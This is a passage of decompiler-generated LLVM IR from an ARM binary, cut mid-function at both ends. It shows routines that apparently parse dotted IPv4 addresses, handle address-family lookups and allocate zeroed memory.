  %v0_14af4 = phi i32 [ 1, %dec_label_pc_14a60 ], [ %v1_14af4, %dec_label_pc_14af0 ]
  %v0_14a78 = phi i32 [ %v0_14a50, %dec_label_pc_14a60 ], [ %v0_14a7812, %dec_label_pc_14af0 ]
  %v1_14a78 = inttoptr i32 %v0_14a78 to i8*
  %v2_14a78 = load i8, i8* %v1_14a78, align 1
  %v3_14a78 = zext i8 %v2_14a78 to i32
  %v4_14a7c = load i32, i32* inttoptr (i32 142964 to i32*), align 4
  %v2_14a80 = mul nuw nsw i32 %v3_14a78, 2
  %v2_14a84 = add i32 %v2_14a80, %v4_14a7c
  %v3_14a84 = inttoptr i32 %v2_14a84 to i16*
  %v4_14a84 = load i16, i16* %v3_14a84, align 2
  %v1_14a88 = and i16 %v4_14a84, 8
  %v2_14a88 = icmp eq i16 %v1_14a88, 0
  br i1 %v2_14a88, label %dec_label_pc_14b2c, label %dec_label_pc_14a90

dec_label_pc_14a90:                               ; preds = %dec_label_pc_14a78
  br label %dec_label_pc_14ab0

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14ab0
  %v2_14a98 = mul i32 %v0_14af0, 10
  %v1_14a9c = add i32 %v2_14a98, -48
  %v2_14aa0 = add i32 %v3_14ab0, %v1_14a9c
  %v8_14aa8 = icmp sgt i32 %v2_14aa0, 255
  br i1 %v8_14aa8, label %dec_label_pc_14b2c, label %dec_label_pc_14aac

dec_label_pc_14aac:                               ; preds = %dec_label_pc_14a98
  %v1_14aac = add i32 %v0_14ae0, 1
  store i32 %v1_14aac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ab0

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14a90, %dec_label_pc_14aac
  %v0_14af0 = phi i32 [ 0, %dec_label_pc_14a90 ], [ %v2_14aa0, %dec_label_pc_14aac ]
  %v0_14ae0 = phi i32 [ %v0_14a78, %dec_label_pc_14a90 ], [ %v1_14aac, %dec_label_pc_14aac ]
  %v1_14ab0 = inttoptr i32 %v0_14ae0 to i8*
  %v2_14ab0 = load i8, i8* %v1_14ab0, align 1
  %v3_14ab0 = zext i8 %v2_14ab0 to i32
  %v2_14ab4 = mul nuw nsw i32 %v3_14ab0, 2
  %v2_14ab8 = add i32 %v2_14ab4, %v4_14a7c
  %v3_14ab8 = inttoptr i32 %v2_14ab8 to i16*
  %v4_14ab8 = load i16, i16* %v3_14ab8, align 2
  %v6_14ab8 = zext i16 %v4_14ab8 to i32
  %v1_14abc = and i32 %v6_14ab8, 8
  %v2_14abc = icmp eq i32 %v1_14abc, 0
  br i1 %v2_14abc, label %dec_label_pc_14ac4, label %dec_label_pc_14a98

dec_label_pc_14ac4:                               ; preds = %dec_label_pc_14ab0
  %v7_14ac4 = icmp eq i32 %v0_14af4, 4
  br i1 %v7_14ac4, label %dec_label_pc_14adc, label %dec_label_pc_14acc

dec_label_pc_14acc:                               ; preds = %dec_label_pc_14ac4
  %v7_14acc = icmp eq i8 %v2_14ab0, 46
  br i1 %v7_14acc, label %dec_label_pc_14ad4, label %dec_label_pc_14b2c

dec_label_pc_14ad4:                               ; preds = %dec_label_pc_14acc
  %v1_14ad4 = add i32 %v0_14ae0, 1
  store i32 %v1_14ad4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14af0

dec_label_pc_14adc:                               ; preds = %dec_label_pc_14ac4
  %v2_14adc = icmp eq i8 %v2_14ab0, 0
  %v1_14ae0 = add i32 %v0_14ae0, 1
  store i32 %v1_14ae0, i32* %r0.global-to-local, align 4
  br i1 %v2_14adc, label %dec_label_pc_14af0, label %dec_label_pc_14ae8

dec_label_pc_14ae8:                               ; preds = %dec_label_pc_14adc
  %v1_14ae8 = and i32 %v6_14ab8, 32
  %v2_14ae8 = icmp eq i32 %v1_14ae8, 0
  br i1 %v2_14ae8, label %dec_label_pc_14b2c, label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14ae8, %dec_label_pc_14adc, %dec_label_pc_14ad4
  %v0_14a7812 = phi i32 [ %v1_14ae0, %dec_label_pc_14ae8 ], [ %v1_14ae0, %dec_label_pc_14adc ], [ %v1_14ad4, %dec_label_pc_14ad4 ]
  %v4_14af0 = mul i32 %v1_14af0, 256
  %v5_14af0 = or i32 %v0_14af0, %v4_14af0
  %v1_14af4 = add nuw nsw i32 %v0_14af4, 1
  %v7_14afc = icmp slt i32 %v1_14af4, 5
  br i1 %v7_14afc, label %dec_label_pc_14a78, label %dec_label_pc_14b00

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14af0
  %v2_14b00 = icmp eq i32 %arg2, 0
  br i1 %v2_14b00, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_14b00
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b30

bb:                                               ; preds = %dec_label_pc_14b00
  %v4_14b04 = udiv i32 %v5_14af0, 16777216
  %v2_14b08 = udiv i32 %v5_14af0, 256
  %v5_14b0c = and i32 %v2_14b08, 65280
  %v2_14b10 = and i32 %v5_14af0, 65280
  %v5_14b14 = mul nuw nsw i32 %v2_14b10, 256
  %v5_14b18 = mul i32 %v0_14af0, 16777216
  %v6_14b0c = or i32 %v4_14b04, %v5_14b18
  %v6_14b14 = or i32 %v6_14b0c, %v5_14b0c
  %v6_14b18 = or i32 %v6_14b14, %v5_14b14
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_14b24 = inttoptr i32 %arg2 to i32*
  store i32 %v6_14b18, i32* %v3_14b24, align 4
  %v2_14b30.pre = load i32, i32* %stack_var_-28, align 4
  %v1_14b34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14b2c:                               ; preds = %dec_label_pc_14acc, %dec_label_pc_14ae8, %dec_label_pc_14a78, %dec_label_pc_14a98, %dec_label_pc_14a48
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14b30:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_14b2c
  %v1_14b34 = phi i32 [ %v1_14b34.pre, %bb ], [ 0, %dec_label_pc_14b2c ], [ 1, %.thread7.thread ]
  %v2_14b30 = phi i32 [ %v2_14b30.pre, %bb ], [ %v3_14a48, %dec_label_pc_14b2c ], [ %v3_14a48, %.thread7.thread ]
  store i32 %v2_14b30, i32* @r4, align 4
  ret i32 %v1_14b34

; uselistorder directives
  uselistorder i32 %v1_14af4, { 1, 0 }
  uselistorder i32 %v5_14af0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14ae0, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 6, 7, 8, 3, 4, 5, 0, 1 }
  uselistorder i32 65280, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14b30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14b2c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_14ab0, { 1, 0 }
  uselistorder label %dec_label_pc_14a78, { 1, 0 }
}

define i32 @function_14b40(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14b40:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_14b40 = load i32, i32* @r6, align 4
  %v12_14b40 = load i32, i32* @r7, align 4
  %v15_14b40 = load i32, i32* @r8, align 4
  %v18_14b40 = load i32, i32* @sb, align 4
  %v21_14b40 = load i32, i32* @sl, align 4
  %v24_14b40 = load i32, i32* @fp, align 4
  %v7_14b44 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_14b44, label %dec_label_pc_14b68, label %dec_label_pc_14b88

dec_label_pc_14b68:                               ; preds = %dec_label_pc_14b40
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_14b80 = call i32 @function_170cc()
  store i32 %v0_14b80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14dd4

dec_label_pc_14b88:                               ; preds = %dec_label_pc_14b40
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_14b90 = icmp eq i32 %arg2, 10
  %v2_14b94 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_14b94, align 4
  br i1 %v7_14b90, label %dec_label_pc_14b9c, label %dec_label_pc_14dd0

dec_label_pc_14b9c:                               ; preds = %dec_label_pc_14b88
  %v1_14b9c = load i32, i32* @r7, align 4
  %v9_14b9c = icmp eq i32 %v1_14b9c, %arg1
  br i1 %v9_14b9c, label %dec_label_pc_14dd0, label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %dec_label_pc_14b9c
  %v0_14ba4 = call i32 @function_ce08()
  store i32 %v0_14ba4, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_14ba4, i32* @r5, align 4
  %v0_14bb0 = load i32, i32* @r4, align 4
  %v0_14bb4 = load i32, i32* @r6, align 4
  store i32 %v0_14bb4, i32* %r2.global-to-local, align 4
  %v1_14bb8 = inttoptr i32 %v0_14ba4 to i32*
  %v2_14bb8 = load i32, i32* %v1_14bb8, align 4
  store i32 %v2_14bb8, i32* @r4, align 4
  %v0_14bbc = load i32, i32* @r8, align 4
  store i32 %v0_14bbc, i32* %r3.global-to-local, align 4
  %v0_14bc0 = load i32, i32* @r7, align 4
  store i32 %v0_14bc0, i32* %v1_14bb8, align 4
  %v0_14bc4 = load i32, i32* @sb, align 4
  store i32 %v0_14bc4, i32* %r0.global-to-local, align 4
  %v2_14bc8 = load i32, i32* @sl, align 4
  %v5_14bc8 = load i32, i32* %ip.global-to-local, align 4
  %v0_14bcc = load i32, i32* @fp, align 4
  %v7_14bd0 = call i32 @function_17080(i32 %v0_14bc4, i32 %v0_14bb0, i32 %v0_14bb4, i32 %v0_14bbc, i32 %v2_14bc8, i32 %v5_14bc8, i32 %v0_14bcc)
  store i32 %v7_14bd0, i32* %r0.global-to-local, align 4
  %v2_14bd4 = icmp eq i32 %v7_14bd0, 0
  br i1 %v2_14bd4, label %bb, label %dec_label_pc_14be0

bb:                                               ; preds = %dec_label_pc_14ba4
  %v1_14bd8 = load i32, i32* @r4, align 4
  %v2_14bd8 = load i32, i32* @r5, align 4
  %v3_14bd8 = inttoptr i32 %v2_14bd8 to i32*
  store i32 %v1_14bd8, i32* %v3_14bd8, align 4
  br label %dec_label_pc_14dd4

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14ba4
  %v0_14be0 = load i32, i32* @fp, align 4
  %v1_14be0 = inttoptr i32 %v0_14be0 to i32*
  %v2_14be0 = load i32, i32* %v1_14be0, align 4
  store i32 %v2_14be0, i32* %r3.global-to-local, align 4
  %v7_14be4 = icmp eq i32 %v2_14be0, 1
  br i1 %v7_14be4, label %dec_label_pc_14c00, label %dec_label_pc_14bec

dec_label_pc_14bec:                               ; preds = %dec_label_pc_14be0
  %v7_14bec = icmp eq i32 %v2_14be0, 4
  br i1 %v7_14bec, label %dec_label_pc_14c1c, label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14bec
  %v3_14bf4 = icmp eq i32 %v2_14be0, -1
  br i1 %v3_14bf4, label %dec_label_pc_14c10, label %dec_label_pc_14dd4

dec_label_pc_14c00:                               ; preds = %dec_label_pc_14be0
  %v7_14c00 = icmp eq i32 %v7_14bd0, 2
  br i1 %v7_14c00, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_14c00
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_14c20

.thread1:                                         ; preds = %dec_label_pc_14c00
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_14c20

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14bf4
  %v0_14c10 = load i32, i32* @r5, align 4
  %v1_14c10 = inttoptr i32 %v0_14c10 to i32*
  %v2_14c10 = load i32, i32* %v1_14c10, align 4
  store i32 %v2_14c10, i32* %r3.global-to-local, align 4
  %v7_14c14 = icmp eq i32 %v2_14c10, 2
  br i1 %v7_14c14, label %dec_label_pc_14c1c, label %dec_label_pc_14dd4

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14c10, %dec_label_pc_14bec
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_14c20

dec_label_pc_14c20:                               ; preds = %bb29, %.thread1, %dec_label_pc_14c1c
  %v0_14c20 = load i32, i32* @r8, align 4
  %v1_14c20 = sub i32 0, %v0_14c20
  %v1_14c24 = urem i32 %v1_14c20, 4
  store i32 %v1_14c24, i32* %r0.global-to-local, align 4
  %v1_14c28 = load i32, i32* @sl, align 4
  %v2_14c28 = sub i32 %v1_14c28, %v1_14c24
  %v1_14c2c = add i32 %v2_14c28, -24
  store i32 %v1_14c2c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_14c38 = load i32, i32* @r4, align 4
  %v1_14c38 = load i32, i32* @r5, align 4
  %v2_14c38 = inttoptr i32 %v1_14c38 to i32*
  store i32 %v0_14c38, i32* %v2_14c38, align 4
  %v7_14c3c = icmp sgt i32 %v1_14c2c, 255
  br i1 %v7_14c3c, label %dec_label_pc_14c48, label %bb30

bb30:                                             ; preds = %dec_label_pc_14c20
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_14c40 = load i32, i32* %r3.global-to-local, align 4
  %v1_14c40 = load i32, i32* @fp, align 4
  %v2_14c40 = inttoptr i32 %v1_14c40 to i32*
  store i32 %v0_14c40, i32* %v2_14c40, align 4
  br label %dec_label_pc_14dd4

dec_label_pc_14c48:                               ; preds = %dec_label_pc_14c20
  %v0_14c403 = load i32, i32* %r3.global-to-local, align 4
  %v1_14c404 = load i32, i32* @fp, align 4
  %v2_14c405 = inttoptr i32 %v1_14c404 to i32*
  store i32 %v0_14c403, i32* %v2_14c405, align 4
  %v0_14c48 = load i32, i32* @r8, align 4
  %v1_14c48 = load i32, i32* %r0.global-to-local, align 4
  %v2_14c48 = add i32 %v1_14c48, %v0_14c48
  store i32 %v2_14c48, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_14c50 = add i32 %v2_14c48, 16
  store i32 %v1_14c50, i32* %r2.global-to-local, align 4
  %v1_14c54 = add i32 %v2_14c48, 24
  store i32 %v1_14c54, i32* @r5, align 4
  %v3_14c5c = inttoptr i32 %v1_14c50 to i32*
  store i32 %v2_14c48, i32* %v3_14c5c, align 4
  %v0_14c60 = load i32, i32* @sb, align 4
  store i32 %v0_14c60, i32* @r1, align 4
  %v0_14c64 = load i32, i32* @r4, align 4
  %v1_14c64 = load i32, i32* %r2.global-to-local, align 4
  %v2_14c64 = add i32 %v1_14c64, 4
  %v3_14c64 = inttoptr i32 %v2_14c64 to i32*
  store i32 %v0_14c64, i32* %v3_14c64, align 4
  %v0_14c68 = load i32, i32* @r5, align 4
  store i32 %v0_14c68, i32* %r0.global-to-local, align 4
  %v0_14c6c = load i32, i32* @sl, align 4
  store i32 %v0_14c6c, i32* %r2.global-to-local, align 4
  %v3_14c70 = call i32 @function_f560(i32 %v0_14c68, i32 %v0_14c60, i32 %v0_14c6c)
  %v0_14c74 = load i32, i32* @r4, align 4
  %v1_14c74 = trunc i32 %v0_14c74 to i8
  %v2_14c74 = load i32, i32* @r5, align 4
  %v3_14c74 = load i32, i32* @sl, align 4
  %v4_14c74 = add i32 %v3_14c74, %v2_14c74
  %v5_14c74 = inttoptr i32 %v4_14c74 to i8*
  store i8 %v1_14c74, i8* %v5_14c74, align 1
  %v0_14c78 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_14c80 = load i32, i32* @r8, align 4
  store i32 %v0_14c80, i32* %r2.global-to-local, align 4
  %v3_14c84 = inttoptr i32 %v0_14c78 to i8*
  %v4_14c84 = call i32 @function_15c1c(i32 10, i8* %v3_14c84, i32 %v0_14c80)
  store i32 %v4_14c84, i32* %r0.global-to-local, align 4
  %v1_14c88 = load i32, i32* @r4, align 4
  %v9_14c88 = icmp eq i32 %v4_14c84, %v1_14c88
  br i1 %v9_14c88, label %dec_label_pc_14cc0, label %dec_label_pc_14c90

dec_label_pc_14c90:                               ; preds = %dec_label_pc_14c48
  store i32 %v1_14c50, i32* @ip, align 4
  %v0_14c98 = load i32, i32* @r6, align 4
  store i32 %v0_14c98, i32* %v2_14b94, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_14ca0 = load i32, i32* @r6, align 4
  %v2_14ca0 = add i32 %v1_14ca0, 8
  %v3_14ca0 = inttoptr i32 %v2_14ca0 to i32*
  store i32 10, i32* %v3_14ca0, align 4
  %v0_14ca4 = load i32, i32* @r4, align 4
  store i32 %v0_14ca4, i32* %r0.global-to-local, align 4
  %v0_14ca8 = load i32, i32* %r3.global-to-local, align 4
  %v1_14ca8 = add i32 %v0_14ca8, 6
  store i32 %v1_14ca8, i32* %r3.global-to-local, align 4
  %v1_14cac = load i32, i32* @r6, align 4
  %v2_14cac = add i32 %v1_14cac, 12
  %v3_14cac = inttoptr i32 %v2_14cac to i32*
  store i32 %v1_14ca8, i32* %v3_14cac, align 4
  %v0_14cb0 = load i32, i32* @r5, align 4
  %v1_14cb0 = load i32, i32* @r6, align 4
  %v2_14cb0 = inttoptr i32 %v1_14cb0 to i32*
  store i32 %v0_14cb0, i32* %v2_14cb0, align 4
  %v0_14cb4 = load i32, i32* @ip, align 4
  %v1_14cb4 = load i32, i32* @r6, align 4
  %v2_14cb4 = add i32 %v1_14cb4, 16
  %v3_14cb4 = inttoptr i32 %v2_14cb4 to i32*
  store i32 %v0_14cb4, i32* %v3_14cb4, align 4
  %v0_14cb8 = load i32, i32* @r4, align 4
  %v1_14cb8 = load i32, i32* @fp, align 4
  %v2_14cb8 = inttoptr i32 %v1_14cb8 to i32*
  store i32 %v0_14cb8, i32* %v2_14cb8, align 4
  br label %dec_label_pc_14dd4

dec_label_pc_14cc0:                               ; preds = %dec_label_pc_14c48
  %v0_14cc0 = load i32, i32* @r7, align 4
  %v2_14cc0 = icmp eq i32 %v0_14cc0, 0
  br i1 %v2_14cc0, label %dec_label_pc_14cc8, label %dec_label_pc_14dc0

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cc0
  %v2_14cc8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_14cc8, i32* @r4, align 4
  store i32 %v2_14cc8, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_14cd8 = bitcast i32* %stack_var_-84 to i8*
  %v3_14cd8 = call i32 @function_f240(i8* %v2_14cd8, i32 0)
  store i32 %v3_14cd8, i32* %r0.global-to-local, align 4
  %v2_14ce0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_14ce0, i32* @sb, align 4
  %v7_14d20 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_14ce4

dec_label_pc_14ce4:                               ; preds = %dec_label_pc_14d38, %dec_label_pc_14cc8
  store i32 %v2_14ce0, i32* %r2.global-to-local, align 4
  store i32 %v2_14cc8, i32* %r3.global-to-local, align 4
  %v0_14cf0 = load i32, i32* @r5, align 4
  store i32 %v0_14cf0, i32* %r0.global-to-local, align 4
  %v4_14cf4 = inttoptr i32 %v0_14cf0 to i8*
  %v5_14cf4 = call i32 @function_162f8(i8* %v4_14cf4, i32 28, i32 %v2_14ce0, i32 %v2_14cc8)
  store i32 %v5_14cf4, i32* @r4, align 4
  %v1_14cf8 = icmp slt i32 %v5_14cf4, 0
  %v0_14cfc = load i32, i32* @sl, align 4
  store i32 %v0_14cfc, i32* %r2.global-to-local, align 4
  %v0_14d00 = load i32, i32* @r7, align 4
  %v1_14d00 = add i32 %v0_14d00, 1
  store i32 %v1_14d00, i32* @r7, align 4
  %v0_14d04 = load i32, i32* @r5, align 4
  store i32 %v0_14d04, i32* %r0.global-to-local, align 4
  br i1 %v1_14cf8, label %dec_label_pc_14dc0, label %dec_label_pc_14d0c

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14ce4
  %v3_14d0c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_14d0c, i32* @r1, align 4
  %v3_14d10 = call i32 @function_f560(i32 %v0_14d04, i32 %v3_14d0c, i32 %v0_14cfc)
  %v3_14d14 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_14d14, i32* @r0, align 4
  %v0_14d18 = call i32 @function_108e4()
  store i32 %v0_14d18, i32* %r0.global-to-local, align 4
  %v0_14d24 = load i32, i32* @r4, align 4
  store i32 %v0_14d24, i32* %r2.global-to-local, align 4
  %v0_14d28 = load i32, i32* @r5, align 4
  store i32 %v0_14d28, i32* @r3, align 4
  br i1 %v7_14d20, label %dec_label_pc_14d30, label %dec_label_pc_14d68

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14d0c
  %v0_14d30 = load i32, i32* @r7, align 4
  %v8_14d34 = icmp sgt i32 %v0_14d30, 5
  br i1 %v8_14d34, label %dec_label_pc_14d5c, label %dec_label_pc_14d38

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14d30
  store i32 %tmp8, i32* @r1, align 4
  %v3_14d3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_14d3c, i32* %r0.global-to-local, align 4
  %v0_14d40 = load i32, i32* @sl, align 4
  %v5_14d44 = call i32 @function_16200(i32 %v3_14d3c, i32 %tmp8, i32 %v0_14d24, i32 %v0_14d28, i32 %v0_14d40)
  store i32 %v5_14d44, i32* @r4, align 4
  %v3_14d4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_14d4c, i32* @r0, align 4
  %v0_14d50 = call i32 @function_108e4()
  store i32 %v0_14d50, i32* %r0.global-to-local, align 4
  %v0_14d54 = load i32, i32* @r4, align 4
  %v1_14d54 = icmp slt i32 %v0_14d54, 0
  br i1 %v1_14d54, label %dec_label_pc_14d5c, label %dec_label_pc_14ce4

dec_label_pc_14d5c:                               ; preds = %dec_label_pc_14d38, %dec_label_pc_14d30
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14dc8

dec_label_pc_14d68:                               ; preds = %dec_label_pc_14d0c
  %v7_14d68 = icmp eq i32 %tmp9, 28
  br i1 %v7_14d68, label %dec_label_pc_14d70, label %dec_label_pc_14db8

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d68
  store i32 16, i32* @r2, align 4
  %v0_14d78 = load i32, i32* @r8, align 4
  store i32 %v0_14d78, i32* @r0, align 4
  %v0_14d7c = call i32 @function_f350()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_14c50, i32* %r2.global-to-local, align 4
  %v1_14d88 = load i32, i32* @r6, align 4
  %v2_14d88 = add i32 %v1_14d88, 8
  %v3_14d88 = inttoptr i32 %v2_14d88 to i32*
  store i32 10, i32* %v3_14d88, align 4
  %v0_14d8c = load i32, i32* %r3.global-to-local, align 4
  %v1_14d8c = add i32 %v0_14d8c, 6
  store i32 %v1_14d8c, i32* %r3.global-to-local, align 4
  %v1_14d90 = load i32, i32* @r6, align 4
  %v2_14d90 = add i32 %v1_14d90, 12
  %v3_14d90 = inttoptr i32 %v2_14d90 to i32*
  store i32 %v1_14d8c, i32* %v3_14d90, align 4
  %v3_14d94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_14d94, i32* @r0, align 4
  %v0_14d98 = load i32, i32* @r5, align 4
  %v1_14d98 = load i32, i32* @r6, align 4
  %v2_14d98 = inttoptr i32 %v1_14d98 to i32*
  store i32 %v0_14d98, i32* %v2_14d98, align 4
  %v0_14d9c = load i32, i32* %r2.global-to-local, align 4
  %v1_14d9c = load i32, i32* @r6, align 4
  %v2_14d9c = add i32 %v1_14d9c, 16
  %v3_14d9c = inttoptr i32 %v2_14d9c to i32*
  store i32 %v0_14d9c, i32* %v3_14d9c, align 4
  %v0_14da0 = call i32 @function_108e4()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_14db0 = load i32, i32* @r6, align 4
  store i32 %v0_14db0, i32* %v2_14b94, align 4
  %v0_14dc8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14dc8

dec_label_pc_14db8:                               ; preds = %dec_label_pc_14d68
  %v3_14db8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_14db8, i32* @r0, align 4
  %v0_14dbc = call i32 @function_108e4()
  store i32 %v0_14dbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14ce4, %dec_label_pc_14cc0, %dec_label_pc_14db8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14dc8

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14d70, %dec_label_pc_14d5c, %dec_label_pc_14dc0
  %v0_14dc8 = phi i32 [ %v0_14dc8.pre, %dec_label_pc_14d70 ], [ 3, %dec_label_pc_14d5c ], [ 1, %dec_label_pc_14dc0 ]
  %v1_14dc8 = load i32, i32* @fp, align 4
  %v2_14dc8 = inttoptr i32 %v1_14dc8 to i32*
  store i32 %v0_14dc8, i32* %v2_14dc8, align 4
  br label %dec_label_pc_14dd4

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14b88, %dec_label_pc_14b9c
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14dd4

dec_label_pc_14dd4:                               ; preds = %bb, %bb30, %dec_label_pc_14c10, %dec_label_pc_14bf4, %dec_label_pc_14dc8, %dec_label_pc_14c90, %dec_label_pc_14b68, %dec_label_pc_14dd0
  store i32 %v9_14b40, i32* @r6, align 4
  store i32 %v12_14b40, i32* @r7, align 4
  store i32 %v15_14b40, i32* @r8, align 4
  store i32 %v18_14b40, i32* @sb, align 4
  store i32 %v21_14b40, i32* @sl, align 4
  store i32 %v24_14b40, i32* @fp, align 4
  %v1_14ddc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14ddc

; uselistorder directives
  uselistorder i32 %v2_14cc8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14c50, { 2, 1, 0, 3 }
  uselistorder i32 %v1_14c24, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 4, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 21, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 23, 13, 14, 16, 15, 17, 22, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32)* @function_f560, { 1, 0, 3, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14dd4, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_14dd0, { 1, 0 }
  uselistorder label %dec_label_pc_14dc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14dc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c20, { 2, 1, 0 }
}

define i32 @function_14de0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14de0:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_14de0 = load i32, i32* @r4, align 4
  %v6_14de0 = load i32, i32* @r5, align 4
  %v9_14de0 = load i32, i32* @r6, align 4
  %v12_14de0 = load i32, i32* @lr, align 4
  %v2_14de8 = icmp eq i32 %arg1, 0
  store i32 142044, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_14df8 = mul i32 %arg2, %arg1
  store i32 %v2_14df8, i32* @r6, align 4
  br i1 %v2_14de8, label %dec_label_pc_14e28, label %dec_label_pc_14e00

dec_label_pc_14e00:                               ; preds = %dec_label_pc_14de0
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_14df8, i32* @r0, align 4
  %v0_14e08 = call i32 @function_c960()
  %v0_14e0c = load i32, i32* @r4, align 4
  %v9_14e0c = icmp eq i32 %v0_14e0c, %v0_14e08
  br i1 %v9_14e0c, label %dec_label_pc_14e00.dec_label_pc_14e28_crit_edge, label %dec_label_pc_14e14

dec_label_pc_14e00.dec_label_pc_14e28_crit_edge:  ; preds = %dec_label_pc_14e00
  %v0_14e2c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14e28

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14e00
